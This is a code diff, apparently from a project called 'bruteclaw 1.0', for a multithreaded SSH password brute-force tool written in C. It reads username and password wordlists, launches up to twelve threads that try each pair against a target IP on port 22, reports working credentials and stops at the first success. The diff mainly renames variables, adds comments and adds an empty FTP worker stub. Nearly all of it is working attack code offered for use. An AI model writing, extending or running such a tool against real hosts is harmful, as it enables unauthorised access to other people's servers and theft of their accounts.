@@ -6,27 +6,29 @@
 
 #define MAX_THREADS 12
 
+// Struct to define the structure of a brute force attempt
 typedef struct {
     char ip[64];
     char username[128];
     char password[128];
 } BruteJob;
 
-void *worker(void *arg) {
+// SSH thread
+void *SSHWorker(void *arg) {
     BruteJob *job = (BruteJob *)arg;
 
     SSHConnection *conn = sshConnect(job->ip, 22, job->username, job->password);
     if (conn) {
         printf("[+] Success: %s:%s\n", job->username, job->password);
         sshDisconnect(conn);
-        exit(0); // kill all on first success
+        exit(0); // Kill all on first success
     } else {
-        // fail
+        // Failure somewhere in this thread, close the thread
         printf("[-] Failed: %s:%s\n", job->username, job->password);
         pthread_exit(NULL);
     }
 }
-
+// Brute force SSH function
 void bruteForceSSH(const char *targetIP, const char *usernameFilename, const char *passwordFilename) {
     printf("[*] Starting SSH brute force\n");
 
@@ -40,7 +42,7 @@ void bruteForceSSH(const char *targetIP, const char *usernameFilename, const cha
 
     char currentUsername[128];
     pthread_t threads[MAX_THREADS];
-    int thread_index = 0;
+    int threadIndex = 0;
 
     while (fgets(currentUsername, sizeof(currentUsername), usernameFile) != NULL) {
         strtok(currentUsername, "\n");
@@ -59,21 +61,21 @@ void bruteForceSSH(const char *targetIP, const char *usernameFilename, const cha
             strncpy(job->password, currentPassword, sizeof(job->password));
 
             // launch thread
-            pthread_create(&threads[thread_index], NULL, worker, (void *)job);
-            thread_index++;
+            pthread_create(&threads[threadIndex], NULL, SSHWorker, (void *)job);
+            threadIndex++;
 
             // thread pool limiting
-            if (thread_index >= MAX_THREADS) {
-                for (int i = 0; i < thread_index; i++) {
+            if (threadIndex >= MAX_THREADS) {
+                for (int i = 0; i < threadIndex; i++) {
                     pthread_join(threads[i], NULL);
                 }
-                thread_index = 0;
+                threadIndex = 0;
             }
         }
     }
 
-    // wait for leftovers
-    for (int i = 0; i < thread_index; i++) {
+    // Wait for leftovers
+    for (int i = 0; i < threadIndex; i++) {
         pthread_join(threads[i], NULL);
     }
 
@@ -83,6 +85,13 @@ void bruteForceSSH(const char *targetIP, const char *usernameFilename, const cha
     printf("[-] Brute complete, no creds found.\n");
 }
 
+// FTP worker
+void FTPWorker(void *arg) {
+    BruteJob *job = (BruteJob *)arg;
+}
+// Main FTP brute force function
+
+// Entry point and argument handling
 int main(int argc, char *argv[]) {
     printf("[*] Starting bruteclaw 1.0\n");
 
